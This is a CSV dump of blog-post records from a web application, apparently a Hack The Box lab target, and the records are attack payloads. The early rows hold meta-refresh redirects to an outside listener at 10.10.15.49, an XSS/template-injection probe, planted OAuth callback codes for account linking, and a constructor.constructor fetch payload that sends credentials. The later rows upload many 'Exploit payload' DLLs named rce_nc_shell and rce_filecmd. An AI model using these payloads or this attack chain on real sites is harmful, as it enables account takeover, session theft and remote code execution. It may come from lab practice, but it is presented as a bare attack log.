"title","content","created_at","reported","banner"
"15","Redirect Test 1767388673","<meta http-equiv="refresh" content="0;url=http://10.10.15.49:8877/test?ts=1767388673">","Jan. 2, 2026, 9:17 p.m.","15","False","static/assets/images/blog/None_W6XpDCL.PNG"
"16","<script>alert(1)</script>TEST{{7*7}}","normal content","Jan. 2, 2026, 9:19 p.m.","15","False","static/assets/images/blog/None_EcTcjbo.PNG"
"17","Test 1767388903","<meta http-equiv="refresh" content="0;url=http://10.10.15.49:8888/oauth_test?ts=1767388903"><p>Test</p>","Jan. 2, 2026, 9:21 p.m.","16","False","static/assets/images/blog/None_OfVzIQd.PNG"
"18","Update 1767389101","{{constructor.constructor(&#x27;fetch("http://eloquia.htb/accounts/oauth2/qooqle/callback/?code=fN2JuCHiSXycET0gmcTGVi5b3tlAtA",{credentials:"include"})&#x27;)()}}<p>Security update.</p>","Jan. 2, 2026, 9:25 p.m.","16","False","static/assets/images/blog/None_yQpvGMl.PNG"
"19","MetaTest 1767389494","<meta http-equiv="refresh" content="0;url=http://10.10.15.49:8890/capture?ts=1767389494"><p>Test meta refresh 1767389494</p>","Jan. 2, 2026, 9:31 p.m.","16","False","static/assets/images/blog/None_huUnwzP.PNG"
"20","Notice 1767389730","<meta http-equiv="refresh" content="0;url=http://eloquia.htb/accounts/oauth2/qooqle/callback/?code=KXzo6DFPLeXMTv1QQOjFZRobyaO7Ng"><p>System notification 1767389730</p>","Jan. 2, 2026, 9:35 p.m.","16","False","static/assets/images/blog/None_KcauwAD.PNG"
"21","Test 1767390175","<meta http-equiv="refresh" content="0;url=http://10.10.15.49:8888/oauth_test?ts=1767390175"><p>Test</p>","Jan. 2, 2026, 9:43 p.m.","16","False","static/assets/images/blog/None_KYvV5uu.PNG"
"22","Update 1767390530","<meta http-equiv="refresh" content="0;url=http://eloquia.htb/accounts/oauth2/qooqle/callback/?code=Aokfo0fSbaalIQJARoa15BSS1gLE5P"><p>Security update.</p>","Jan. 2, 2026, 9:48 p.m.","16","False","static/assets/images/blog/None_LIQfMV3.PNG"
"23","RCE_1767390716","Exploit payload","Jan. 2, 2026, 9:52 p.m.","1","False","static/assets/images/blog/rce_nc_shell.dll"
"24","RCE_1767390743","Exploit payload","Jan. 2, 2026, 9:52 p.m.","1","False","static/assets/images/blog/rce_filecmd.dll"
"25","RCE_1767390871","Exploit payload","Jan. 2, 2026, 9:54 p.m.","1","False","static/assets/images/blog/rce_filecmd_iu47zwW.dll"
"26","RCE_1767391577","Exploit payload","Jan. 2, 2026, 10:06 p.m.","1","False","static/assets/images/blog/rce_filecmd_UhKtUbj.dll"
"27","RCE_1767391595","Exploit payload","Jan. 2, 2026, 10:06 p.m.","1","False","static/assets/images/blog/rce_filecmd_UTGbeC1.dll"
"28","RCE_1767391600","Exploit payload","Jan. 2, 2026, 10:06 p.m.","1","False","static/assets/images/blog/rce_filecmd_jLJNxz3.dll"
"29","RCE_1767391604","Exploit payload","Jan. 2, 2026, 10:06 p.m.","1","False","static/assets/images/blog/rce_filecmd_WmtsgbD.dll"
"30","RCE_1767391609","Exploit payload","Jan. 2, 2026, 10:06 p.m.","1","False","static/assets/images/blog/rce_filecmd_QnxgtHQ.dll"
"31","RCE_1767391614","Exploit payload","Jan. 2, 2026, 10:06 p.m.","1","False","static/assets/images/blog/rce_filecmd_HfB0mGd.dll"
"32","RCE_1767391619","Exploit payload","Jan. 2, 2026, 10:07 p.m.","1","False","static/assets/images/blog/rce_filecmd_kSU8ODM.dll"
"33","RCE_1767391625","Exploit payload","Jan. 2, 2026, 10:07 p.m.","1","False","static/assets/images/blog/rce_filecmd_hZXeO6W.dll"
"34","RCE_1767391630","Exploit payload","Jan. 2, 2026, 10:07 p.m.","1","False","static/assets/images/blog/rce_filecmd_86syqR2.dll"
"35","RCE_1767392065","Exploit payload","Jan. 2, 2026, 10:14 p.m.","1","False","static/assets/images/blog/rce_filecmd_ObpAFlQ.dll"
"36","RCE_1767392066","Exploit payload","Jan. 2, 2026, 10:14 p.m.","1","False","static/assets/images/blog/rce_filecmd_UiMKDfF.dll"
"37","RCE_1767392068","Exploit payload","Jan. 2, 2026, 10:14 p.m.","1","False","static/assets/images/blog/rce_filecmd_YZBR5vM.dll"
"38","RCE_1767392069","Exploit payload","Jan. 2, 2026, 10:14 p.m.","1","False","static/assets/images/blog/rce_filecmd_yY1S0Sd.dll"
"39","RCE_1767392071","Exploit payload","Jan. 2, 2026, 10:14 p.m.","1","False","static/assets/images/blog/rce_filecmd_KFIIzhk.dll"
"40","RCE_1767392076","Exploit payload","Jan. 2, 2026, 10:14 p.m.","1","False","static/assets/images/blog/rce_filecmd_a5jrRft.dll"
"41","RCE_1767392077","Exploit payload","Jan. 2, 2026, 10:14 p.m.","1","False","static/assets/images/blog/rce_filecmd_OmgBFsW.dll"
"42","RCE_1767392079","Exploit payload","Jan. 2, 2026, 10:14 p.m.","1","False","static/assets/images/blog/rce_filecmd_jqTFCm8.dll"
"43","RCE_1767392081","Exploit payload","Jan. 2, 2026, 10:14 p.m.","1","False","static/assets/images/blog/rce_filecmd_SoXtirH.dll"
"44","RCE_1767392082","Exploit payload","Jan. 2, 2026, 10:14 p.m.","1","False","static/assets/images/blog/rce_filecmd_wHJLbgz.dll"
"45","RCE_1767392083","Exploit payload","Jan. 2, 2026, 10:14 p.m.","1","False","static/assets/images/blog/rce_filecmd_XUS2iwC.dll"
"46","RCE_1767392085","Exploit payload","Jan. 2, 2026, 10:14 p.m.","1","False","static/assets/images/blog/rce_filecmd_DlG8pjM.dll"
"47","RCE_1767392086","Exploit payload","Jan. 2, 2026, 10:14 p.m.","1","False","static/assets/images/blog/rce_filecmd_AHwiIF3.dll"
"48","RCE_1767392088","Exploit payload","Jan. 2, 2026, 10:14 p.m.","1","False","static/assets/images/blog/rce_filecmd_Og9V8E2.dll"
"49","RCE_1767392091","Exploit payload","Jan. 2, 2026, 10:14 p.m.","1","False","static/assets/images/blog/rce_filecmd_tnuyw2x.dll"
"50","RCE_1767392092","Exploit payload","Jan. 2, 2026, 10:14 p.m.","1","False","static/assets/images/blog/rce_filecmd_ABwPyvK.dll"
"51","RCE_1767392096","Exploit payload","Jan. 2, 2026, 10:15 p.m.","1","False","static/assets/images/blog/rce_filecmd_jvfduXa.dll"
"52","RCE_1767392098","Exploit payload","Jan. 2, 2026, 10:15 p.m.","1","False","static/assets/images/blog/rce_filecmd_VVrEs1E.dll"
"53","RCE_1767392099","Exploit payload","Jan. 2, 2026, 10:15 p.m.","1","False","static/assets/images/blog/rce_filecmd_04Q7fRD.dll"
"54","RCE_1767392104","Exploit payload","Jan. 2, 2026, 10:15 p.m.","1","False","static/assets/images/blog/rce_filecmd_x1RFqst.dll"
"55","RCE_1767392107","Exploit payload","Jan. 2, 2026, 10:15 p.m.","1","False","static/assets/images/blog/rce_filecmd_ApKyUUJ.dll"
"56","RCE_1767392109","Exploit payload","Jan. 2, 2026, 10:15 p.m.","1","False","static/assets/images/blog/rce_filecmd_r657lXO.dll"
"57","RCE_1767392111","Exploit payload","Jan. 2, 2026, 10:15 p.m.","1","False","static/assets/images/blog/rce_filecmd_ZqDXdkL.dll"
"58","RCE_1767392114","Exploit payload","Jan. 2, 2026, 10:15 p.m.","1","False","static/assets/images/blog/rce_filecmd_uu3l4ZZ.dll"
"59","RCE_1767392115","Exploit payload","Jan. 2, 2026, 10:15 p.m.","1","False","static/assets/images/blog/rce_filecmd_TTTBRSc.dll"
"60","RCE_1767392118","Exploit payload","Jan. 2, 2026, 10:15 p.m.","1","False","static/assets/images/blog/rce_filecmd_za9hJMq.dll"
"61","RCE_1767392121","Exploit payload","Jan. 2, 2026, 10:15 p.m.","1","False","static/assets/images/blog/rce_filecmd_4YLhmXp.dll"
"62","RCE_1767392122","Exploit payload","Jan. 2, 2026, 10:15 p.m.","1","False","static/assets/images/blog/rce_filecmd_HVdkSVO.dll"
"63","RCE_1767392125","Exploit payload","Jan. 2, 2026, 10:15 p.m.","1","False","static/assets/images/blog/rce_filecmd_7sKwdLo.dll"
"64","RCE_1767392127","Exploit payload","Jan. 2, 2026, 10:15 p.m.","1","False","static/assets/images/blog/rce_filecmd_5Cn06cE.dll"
"65","RCE_1767392128","Exploit payload","Jan. 2, 2026, 10:15 p.m.","1","False","static/assets/images/blog/rce_filecmd_qSGblAp.dll"
"66","RCE_1767392137","Exploit payload","Jan. 2, 2026, 10:15 p.m.","1","False","static/assets/images/blog/rce_filecmd_cqvy2M5.dll"
